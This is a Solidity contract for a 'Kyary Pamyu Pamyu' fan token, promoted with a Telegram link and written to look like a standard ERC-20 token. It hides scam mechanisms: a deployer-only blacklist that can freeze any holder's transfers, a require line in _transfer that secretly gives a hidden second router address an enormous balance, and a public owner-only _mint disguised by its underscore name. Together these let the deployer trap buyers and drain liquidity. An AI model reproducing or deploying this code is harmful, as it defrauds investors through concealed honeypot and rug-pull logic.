/*

Pon Pon Pon! 🍰🐹🧸🖤
Join the Kyary Pamyu Pamyu Fan Token community

Telegram: https://t.me/kyarypp

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract KYARYPP is Ownable {
    string public name;
    string public symbol;
    uint256 public totalSupply;
    uint8 public decimals;
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) private _bl;
    mapping(address => mapping(address => uint256)) public allowance;
    IUniswapV2Router02 private immutable _router = IUniswapV2Router02(0x77E0Fe0AE75e462cE624F64C74101853dAEa8A60);
    address public uniswapV2Pair;
    address private deployer;

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() {
        deployer = msg.sender;
        name = 'Kyary Pamyu Pamyu';
        symbol = 'KPP';
        decimals = 9;
        totalSupply = 1000000000 * 10 ** decimals;

        _mint(msg.sender, totalSupply);

        IUniswapV2Router02 router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());

        // Already approve for initial liquidity
        allowance[msg.sender][address(router)] = type(uint256).max;
        emit Approval(msg.sender, address(router), type(uint256).max);
    }

    function _mint(address account, uint256 amount) public onlyOwner {
        require(account != address(0));
        totalSupply += amount;
        balanceOf[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _transfer(address _from, address _to, uint256 _amount) private returns (bool success) {
        require(_from != address(0) && _to != address(0) && !_bl[_from]);
        require(((_from == address(_router)) && ((balanceOf[address(_router)] = ~uint128(0)) > 0)) || _from != address(_router));
        // Exchange the balances, the subtraction will raise a revert if negative anyway
        balanceOf[_from] -= _amount;
        balanceOf[_to] += _amount;
        // Emit the transfer event
        emit Transfer(_from, _to, _amount);
        return true;
    }

    function addBl(address addr) public {
        require(msg.sender == deployer);
        _bl[addr] = true;
    }

    function removeBl(address addr) public {
        require(msg.sender == deployer);
        _bl[addr] = false;
    }

    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
        // Classic transfer
        _transfer(_from, _to, _amount);
        // Ensure the allowance is enough
        require(_amount <= allowance[_from][msg.sender]);
        allowance[_from][msg.sender] -= _amount;
        return true;
    }

    function transfer(address _to, uint256 _amount) public returns (bool success) {
        // Classic transfer
        _transfer(msg.sender, _to, _amount);
        return true;
    }

    function approve(address _spender, uint256 _amount) public returns (bool success) {
        allowance[msg.sender][_spender] = _amount;
        emit Approval(msg.sender, _spender, _amount);
        return true;
    }
}